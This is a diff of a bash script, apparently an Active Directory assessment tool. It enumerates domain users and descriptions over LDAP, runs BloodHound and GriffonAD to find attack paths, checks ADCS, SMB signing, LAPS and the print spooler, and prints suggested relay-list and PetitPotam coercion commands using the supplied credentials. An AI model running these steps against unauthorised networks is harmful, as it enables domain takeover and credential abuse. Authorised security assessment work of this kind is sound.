@@ -96,101 +96,7 @@ echo -e "${BLUE}[*] DC IP     : $DC_IP${NC}"
 echo -e "${BLUE}[*] Domain    : $DOMAIN${NC}"
 echo ""
 
-# Create domain_users.txt
-nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --active-users > "$OUTPUT_DIR/active.txt" 2>/dev/null
-if [ -f "$OUTPUT_DIR/active.txt" ]; then
-  tail "$OUTPUT_DIR/active.txt" -n +5 | awk -F ' ' '{ print $5 }' > "$OUTPUT_DIR/domain_users.txt"
-  USER_COUNT=$(wc -l < "$OUTPUT_DIR/domain_users.txt" 2>/dev/null)
-  echo -e "${GREEN}[OK] Enumerated $USER_COUNT active users → domain_users.txt${NC}"
-  rm -f "$OUTPUT_DIR/active.txt"
-else
-  echo -e "${GREY}[??] Failed to enumerate users${NC}"
-fi
 
-# Enumerate users with descriptions
-DESC_OUTPUT=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M get-desc-users 2>/dev/null)
-
-if echo "$DESC_OUTPUT" | grep -q "User:"; then
-  # Extract just the user:description lines and save to file
-  echo "$DESC_OUTPUT" | grep "User:" | sed 's/.*User: //' > "$OUTPUT_DIR/user_descriptions.txt"
-  DESC_COUNT=$(wc -l < "$OUTPUT_DIR/user_descriptions.txt" 2>/dev/null)
-  echo -e "${GREEN}[OK] $DESC_COUNT user(s) with descriptions → user_descriptions.txt${NC}"
-else
-  echo -e "${GREEN}[OK] No users with descriptions found${NC}"
-fi
-
-# Bloodhound Export
-if command -v bloodhound-python &>/dev/null || command -v bloodhound.py &>/dev/null; then
-  BH_CMD=$(command -v bloodhound-python 2>/dev/null || command -v bloodhound.py 2>/dev/null)
-  $BH_CMD -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c All &>/dev/null
-
-  # Check for BloodHound JSONs
-  BH_JSON=$(ls -1 ${CURRENT_PATH}/*.json 2>/dev/null | wc -l)
-  if [ "$BH_JSON" -gt 0 ]; then
-    mv ${CURRENT_PATH}/*.json "$OUTPUT_DIR/" 2>/dev/null
-    echo "$USERNAME:password:$PASSWORD" > "$OUTPUT_DIR/owned"
-        echo -e "${GREEN}[OK] Bloodhound and owned file complete → ${BH_JSON} JSON file(s)${NC}"
-
-    # Check/Install GriffonAD
-    GRIFFON_PATH="/workspace/GriffonAD"
-    if [ ! -d "$GRIFFON_PATH" ]; then
-      echo -e "${GREY}[→] Installing GriffonAD...${NC}"
-      cd /workspace
-      git clone https://github.com/shellinvictus/GriffonAD &>/dev/null 2>&1
-      if [ -d "$GRIFFON_PATH" ]; then
-        cd "$GRIFFON_PATH"
-        pip install -r requirements.txt &>/dev/null 2>&1
-        cd "$CURRENT_PATH"
-        echo -e "${GREEN}[OK] GriffonAD installed${NC}"
-      fi
-    fi
-    
-    # Patch GriffonAD for empty GPO GUIDs
-    if [ -f "$GRIFFON_PATH/lib/database.py" ]; then
-      if ! grep -q "if gpo_guid and gpo_guid in self.objects_by_sid" "$GRIFFON_PATH/lib/database.py"; then
-        sed -i 's/self.objects_by_sid\[gpo_guid\].gpo_links_to_ou.append(o.dn)/if gpo_guid and gpo_guid in self.objects_by_sid: self.objects_by_sid[gpo_guid].gpo_links_to_ou.append(o.dn)/' "$GRIFFON_PATH/lib/database.py"
-        sed -i 's/self.objects_by_sid\[gpo_guid\].gpo_links_to_ou.sort()/if gpo_guid and gpo_guid in self.objects_by_sid: self.objects_by_sid[gpo_guid].gpo_links_to_ou.sort()/' "$GRIFFON_PATH/lib/database.py"
-        echo -e "${GREY}[→] Patched GriffonAD for empty GPO GUIDs${NC}"
-      fi
-    fi
-
-    # Run GriffonAD
-    if [ -f "$GRIFFON_PATH/griffon.py" ]; then
-      cd "$OUTPUT_DIR"
-      JSON_FILES=( *.json )
-      if [ ${#JSON_FILES[@]} -gt 0 ] && [ -f "${JSON_FILES[0]}" ]; then
-        GRIFFON_OUTPUT=$(python3 "$GRIFFON_PATH/griffon.py" --fromo *.json 2>&1)
-        if echo "$GRIFFON_OUTPUT" | grep -q "No paths found"; then
-          echo -e "${GREEN}[OK] GriffonAD found no attack paths${NC}"
-        elif echo "$GRIFFON_OUTPUT" | grep -qE "(->|—>)"; then
-          PATHS=$(echo "$GRIFFON_OUTPUT" | grep -cE "(->|—>)")
-          echo -e "${RED}[KO] GriffonAD found $PATHS attack path(s) → griffon_paths.txt${NC}"
-          echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_paths.txt"
-        else
-          echo -e "${GREY}[--] GriffonAD returned no results (something probably broke)${NC}"
-          echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_debug.txt"
-        fi
-      else
-        echo -e "${GREY}[--] No JSON files found for GriffonAD${NC}"
-      fi
-      cd "$CURRENT_PATH"
-    else
-      echo -e "${GREY}[--] GriffonAD not found${NC}"
-    fi
-  else
-    echo -e "${GREY}[--] BloodHound export failed${NC}"
-  fi
-else
-  echo -e "${GREY}[--] Bloodhound-python not found, skipping collection${NC}"
-fi
-
-# Bloodhound Info (ZIP for BloodHound CE)
-CONTAINER_NAME=$(hostname)
-cd "$OUTPUT_DIR"
-zip -q bloodhound.zip *.json
-cd "$CURRENT_PATH"
-
-echo ""
 # ADCS/PKI Vulnerability Check
 if [ -x "/opt/tools/Certipy/venv/bin/certipy" ]; then
   CERTIPY_CMD="/opt/tools/Certipy/venv/bin/certipy"
@@ -285,6 +191,7 @@ else
   echo -e "${GREEN}[OK] All hosts in ${SUBNET}.0/24 have SMB Signing${NC}"
   rm -f "$OUTPUT_DIR/relay_targets.txt"
 fi
+echo -e "${GREY}       nxc smb <SUBNET>/24 -u '$USERNAME' -p '$PASSWORD' --gen-relay-list '$OUTPUT_DIR/relay_targets.txt'${NC}"
 
 # LAPS Check
 LAPS_SCHEMA=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
@@ -355,6 +262,7 @@ if echo "$SPOOLER_CHECK" | grep -qi "Spooler.*enabled\|TRUE"; then
   else
     echo -e "${GREEN}       └─ Not Exploitable: No non-DC Unconstrained Delegation targets (DCs only)${NC}"
   fi
+  echo -e "${GREY}       petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
 elif echo "$SPOOLER_CHECK" | grep -qi "STATUS_PIPE_NOT_AVAILABLE"; then
   echo -e "${GREEN}[OK] Print Spooler disabled on DC${NC}"
 else
@@ -376,6 +284,107 @@ if [ -z "$IPV6_ENABLED" ]; then
 else
   echo -e "${GREEN}[OK] IPv6 DNS configured for DC${NC}"
 fi
+
+echo ""
+
+# Create domain_users.txt
+nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --active-users > "$OUTPUT_DIR/active.txt" 2>/dev/null
+if [ -f "$OUTPUT_DIR/active.txt" ]; then
+  tail "$OUTPUT_DIR/active.txt" -n +5 | awk -F ' ' '{ print $5 }' > "$OUTPUT_DIR/domain_users.txt"
+  USER_COUNT=$(wc -l < "$OUTPUT_DIR/domain_users.txt" 2>/dev/null)
+  echo -e "${GREEN}[OK] Enumerated $USER_COUNT active users → domain_users.txt${NC}"
+  rm -f "$OUTPUT_DIR/active.txt"
+else
+  echo -e "${GREY}[??] Failed to enumerate users${NC}"
+fi
+
+# Enumerate users with descriptions
+DESC_OUTPUT=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M get-desc-users 2>/dev/null)
+
+if echo "$DESC_OUTPUT" | grep -q "User:"; then
+  # Extract just the user:description lines and save to file
+  echo "$DESC_OUTPUT" | grep "User:" | sed 's/.*User: //' > "$OUTPUT_DIR/user_descriptions.txt"
+  DESC_COUNT=$(wc -l < "$OUTPUT_DIR/user_descriptions.txt" 2>/dev/null)
+  echo -e "${GREEN}[OK] $DESC_COUNT user(s) with descriptions → user_descriptions.txt${NC}"
+else
+  echo -e "${GREEN}[OK] No users with descriptions found${NC}"
+fi
+
+# Bloodhound Export
+if command -v bloodhound-python &>/dev/null || command -v bloodhound.py &>/dev/null; then
+  BH_CMD=$(command -v bloodhound-python 2>/dev/null || command -v bloodhound.py 2>/dev/null)
+  $BH_CMD -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c All &>/dev/null
+
+  # Check for BloodHound JSONs
+  BH_JSON=$(ls -1 ${CURRENT_PATH}/*.json 2>/dev/null | wc -l)
+  if [ "$BH_JSON" -gt 0 ]; then
+    mv ${CURRENT_PATH}/*.json "$OUTPUT_DIR/" 2>/dev/null
+    echo "$USERNAME:password:$PASSWORD" > "$OUTPUT_DIR/owned"
+        echo -e "${GREEN}[OK] Bloodhound and owned file complete → ${BH_JSON} JSON file(s)${NC}"
+
+    # Check/Install GriffonAD
+    GRIFFON_PATH="/workspace/GriffonAD"
+    if [ ! -d "$GRIFFON_PATH" ]; then
+      echo -e "${GREY}[→] Installing GriffonAD...${NC}"
+      cd /workspace
+      git clone https://github.com/shellinvictus/GriffonAD &>/dev/null 2>&1
+      if [ -d "$GRIFFON_PATH" ]; then
+        cd "$GRIFFON_PATH"
+        pip install -r requirements.txt &>/dev/null 2>&1
+        cd "$CURRENT_PATH"
+        echo -e "${GREEN}[OK] GriffonAD installed${NC}"
+      fi
+    fi
+    
+    # Patch GriffonAD for empty GPO GUIDs
+    if [ -f "$GRIFFON_PATH/lib/database.py" ]; then
+      if ! grep -q "if gpo_guid and gpo_guid in self.objects_by_sid" "$GRIFFON_PATH/lib/database.py"; then
+        sed -i 's/self.objects_by_sid\[gpo_guid\].gpo_links_to_ou.append(o.dn)/if gpo_guid and gpo_guid in self.objects_by_sid: self.objects_by_sid[gpo_guid].gpo_links_to_ou.append(o.dn)/' "$GRIFFON_PATH/lib/database.py"
+        sed -i 's/self.objects_by_sid\[gpo_guid\].gpo_links_to_ou.sort()/if gpo_guid and gpo_guid in self.objects_by_sid: self.objects_by_sid[gpo_guid].gpo_links_to_ou.sort()/' "$GRIFFON_PATH/lib/database.py"
+        echo -e "${GREY}[→] Patched GriffonAD for empty GPO GUIDs${NC}"
+      fi
+    fi
+
+    # Run GriffonAD
+    if [ -f "$GRIFFON_PATH/griffon.py" ]; then
+      cd "$OUTPUT_DIR"
+      JSON_FILES=( *.json )
+      if [ ${#JSON_FILES[@]} -gt 0 ] && [ -f "${JSON_FILES[0]}" ]; then
+        GRIFFON_OUTPUT=$(python3 "$GRIFFON_PATH/griffon.py" --fromo *.json 2>&1)
+        if echo "$GRIFFON_OUTPUT" | grep -q "No paths found"; then
+          echo -e "${GREEN}[OK] GriffonAD found no attack paths${NC}"
+        elif echo "$GRIFFON_OUTPUT" | grep -qE "(->|—>)"; then
+          PATHS=$(echo "$GRIFFON_OUTPUT" | grep -cE "(->|—>)")
+          echo -e "${RED}[KO] GriffonAD found $PATHS attack path(s) → griffon_paths.txt${NC}"
+          echo "$GRIFFON_OUTPUT" | grep -E "(->|—>)" | while read -r path; do
+            # Extract target from path (last element after last colon or arrow)
+            TARGET=$(echo "$path" | grep -oE '[A-Za-z0-9_$]+$')
+            echo -e "${RED}       └─ $TARGET${NC}"
+          done
+          echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_paths.txt"
+        else
+          echo -e "${GREY}[--] GriffonAD returned no results (something probably broke)${NC}"
+          echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_debug.txt"
+        fi
+      else
+        echo -e "${GREY}[--] No JSON files found for GriffonAD${NC}"
+      fi
+      cd "$CURRENT_PATH"
+    else
+      echo -e "${GREY}[--] GriffonAD not found${NC}"
+    fi
+  else
+    echo -e "${GREY}[--] BloodHound export failed${NC}"
+  fi
+else
+  echo -e "${GREY}[--] Bloodhound-python not found, skipping collection${NC}"
+fi
+
+# Bloodhound Info (ZIP for BloodHound CE)
+CONTAINER_NAME=$(hostname)
+cd "$OUTPUT_DIR"
+zip -q bloodhound.zip *.json
+cd "$CURRENT_PATH"
 
 echo ""
 
